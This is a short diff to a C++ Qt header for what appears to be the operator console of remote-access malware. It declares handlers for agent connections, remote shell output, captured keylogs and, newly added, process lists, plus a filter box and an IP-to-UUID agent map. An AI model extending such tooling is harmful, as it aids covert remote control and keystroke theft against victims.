@@ -11,6 +11,7 @@
 #include <QMenu>
 #include <QInputDialog>
 #include <QLineEdit>
+#include <QComboBox>
 #include "server.hpp"
 
 namespace inferno {
@@ -26,6 +27,7 @@ private slots:
     void onAgentConnected(const QString& ip, const QString& info);
     void onAgentDisconnected(const QString& ip);
     void onShellOutputReceived(const QString& ip, const QString& output);
+    void onProcessListReceived(const QString& ip, const QString& output);
     void onKeylogReceived(const QString& ip, const QString& data);
     void onStatusMessage(const QString& message);
     
@@ -59,9 +61,11 @@ private:
     QPlainTextEdit* m_keylogStream;
     QLabel*         m_statusLabel;
     QLineEdit*      m_searchBox;
+    QComboBox*      m_typeFilter;
     QLineEdit*      m_keylogSearchBox;
     
     // History Buffers
+    QMap<QString, QString> m_agentIpToUuid; // Maps IP to persistent UUID
     QStringList     m_telemetryHistory;
     QStringList     m_keylogHistory;
     
